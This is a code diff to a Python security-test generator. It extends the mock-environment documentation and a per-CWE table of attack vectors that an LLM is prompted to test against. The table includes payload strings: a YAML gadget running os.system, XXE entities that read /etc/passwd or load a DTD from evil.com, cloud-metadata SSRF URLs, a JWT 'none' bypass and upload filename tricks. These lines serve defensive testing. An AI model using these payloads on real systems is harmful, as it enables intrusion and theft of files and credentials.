@@ -72,6 +72,26 @@ MOCK_ENVIRONMENT_DOCS = """**Test Environment (already available, do NOT import)
 - `env.sensitive_accessed`: List of sensitive keys accessed (PASSWORD, SECRET, etc.)
 - **DETECTION**: `assert len(env.access_log) > 0` to verify env vars used (not hardcoded)
 
+**CWE-287/306 Authentication - MockAuthenticator:**
+- `auth.login(username, password)`: Attempt login
+- `auth.last_username`: Last username attempted
+- `auth.last_password`: Last password attempted
+- `auth.auth_attempts`: Total login attempts
+- `auth.failed_attempts`: Failed login attempts
+- **DETECTION**: Check `PermissionError` raised for unauthenticated access
+
+**CWE-94/95 Code Injection - MockEval:**
+- `mock_eval.eval(code)`: Mock eval execution
+- `mock_eval.exec(code)`: Mock exec execution
+- `mock_eval.unsafe_eval_called`: **True if eval() called with untrusted input**
+- `mock_eval.injection_detected`: **True if injection patterns found**
+- **DETECTION**: `assert not mock_eval.unsafe_eval_called` to detect code injection
+
+**CWE-338 Weak Random - MockRandom/MockSecrets:**
+- `random.random()`, `random.randint()`: Weak PRNG (insecure)
+- `secrets.token_hex()`, `secrets.token_urlsafe()`: Secure CSPRNG
+- **DETECTION**: Check that security-sensitive operations use `secrets` not `random`
+
 **Standard libs available:** `os`, `sys`, `re`, `json`, `html`, `base64`, `ast`
 **The function under test is already defined in the namespace.**"""
 
@@ -120,8 +140,12 @@ CWE_ATTACK_VECTORS = {
 
     "CWE-502": """- Pickle deserialization: `pickle.loads(user_input)`
 - YAML unsafe load: `yaml.load(data)` without SafeLoader
+- YAML gadget: `!!python/object/apply:os.system ['id']`, `!!python/object:__main__.Exploit`
+- Marshal unsafe: `marshal.loads(user_input)`
 - eval() on user input: `eval(user_data)`
-- Object injection patterns""",
+- JSON with custom decoder: `json.loads(data, object_hook=evil)`
+- Object injection patterns
+- Deserialization of untrusted data from network/file""",
 
     "CWE-611": """- External entity injection: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
 - Parameter entity: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`
@@ -131,6 +155,15 @@ CWE_ATTACK_VECTORS = {
 - Cloud metadata: `http://169.254.169.254/latest/meta-data/`
 - URL scheme bypass: `file:///etc/passwd`, `dict://`, `gopher://`
 - DNS rebinding attacks""",
+
+    "CWE-20": """- Type validation bypass: passing int where string expected
+- Subdomain spoofing: `evil.com.legitimate.com`, `legitimate.com.evil.com`
+- URL embedding: `http://evil.com/http://legitimate.com`
+- Unicode normalization attacks: homoglyphs, RTL override
+- Null byte injection: `file.txt%00.exe`
+- Length validation bypass: extremely long inputs
+- Format string injection: `%s%s%s%s%s%n`
+- Boundary condition: negative numbers, MAX_INT, empty strings""",
 
     "CWE-703": """- Unhandled exceptions exposing stack traces
 - Missing try/except around risky operations
@@ -188,6 +221,61 @@ CWE_ATTACK_VECTORS = {
 - State-changing GET requests
 - Token bypass via referrer manipulation
 - SameSite cookie misconfiguration""",
+
+    # === CWEs added for dataset2.json (v2.8.0) ===
+    "CWE-312": """- Cleartext storage of sensitive data in variables/files
+- Passwords stored without hashing: `password = user_input`
+- Secrets written to log files or config in plaintext
+- Sensitive data in cookies without encryption
+- Database storage without encryption""",
+
+    "CWE-326": """- Insufficient key length: RSA < 2048 bits, DSA < 2048 bits
+- Weak DH parameters: < 2048 bits
+- Short symmetric keys: AES-128 when 256 required
+- Deprecated key sizes: 1024-bit RSA/DSA
+- Key generation without sufficient entropy""",
+
+    "CWE-347": """- Missing signature verification on JWT tokens
+- Accepting tokens without validating `alg` field
+- JWT `none` algorithm bypass: `{"alg": "none"}`
+- Signature stripping attacks
+- Key confusion: using HMAC secret as RSA public key
+- Missing `exp`/`nbf` claim validation""",
+
+    "CWE-434": """- Unrestricted file upload: accepting `.exe`, `.php`, `.jsp`, `.sh`
+- MIME type bypass: changing Content-Type header
+- Double extension: `file.php.jpg`, `file.txt.exe`
+- Null byte in filename: `file.php%00.jpg`
+- Missing file size limits
+- No content validation (magic bytes check)""",
+
+    "CWE-522": """- Credentials transmitted over HTTP (not HTTPS)
+- Passwords stored in plaintext without hashing
+- Weak password hashing: MD5, SHA1 without salt
+- Missing salt in password hashing
+- Insufficient bcrypt/scrypt work factor
+- API keys in URL query parameters""",
+
+    "CWE-732": """- World-readable file permissions: `chmod 777`, `0o777`
+- World-writable files: `chmod 666`, `0o666`
+- Sensitive files without restricted permissions
+- Missing umask for created files
+- Executable permissions on data files
+- Group-writable configuration files""",
+
+    "CWE-770": """- Missing resource limits on allocations
+- Unbounded memory allocation from user input
+- No limit on file upload size
+- Missing connection pool limits
+- Unbounded list/dict growth from external input
+- Missing rate limiting on API endpoints""",
+
+    "CWE-776": """- XML bomb (billion laughs): nested entity expansion
+- Quadratic blowup via entity expansion
+- `<!ENTITY lol "lol">` nested 10+ levels deep
+- DTD-based entity recursion
+- Memory exhaustion via XML parsing
+- Missing entity expansion limits""",
 }
 
 
@@ -217,7 +305,7 @@ TEST_GENERATION_PROMPT = """Generate security tests for this Python function to 
 3. Tests should FAIL when code has vulnerabilities (string concatenation in SQL, missing validation, etc.)
 4. Test at least 3 different attack vectors for {cwe}
 5. Use assertions to verify security properties (e.g., params not None, payload not in query)
-6. Do NOT include import statements or class definitions
+6. You may import standard library modules (re, inspect, base64, time, json, ast) if needed, but do NOT include class definitions
 
 **Attack vectors for {cwe_name}:**
 {attack_vectors}
@@ -287,7 +375,7 @@ Requirements:
 2. Test the function's behavior with various inputs
 3. Include edge cases and boundary conditions
 4. Use assertions to verify expected behavior
-5. Do NOT include import statements
+5. You may import standard library modules (re, inspect, base64, time, json, ast) if needed
 
 Output ONLY valid Python test functions, nothing else."""
 
@@ -307,7 +395,7 @@ Requirements:
 2. Focus on detecting {cwe} vulnerabilities
 3. Tests should PASS on secure implementations
 4. Tests should FAIL on vulnerable implementations
-5. Do NOT include import statements
+5. You may import standard library modules (re, inspect, base64, time, json, ast) if needed
 
 Output ONLY valid Python test functions, nothing else."""
 
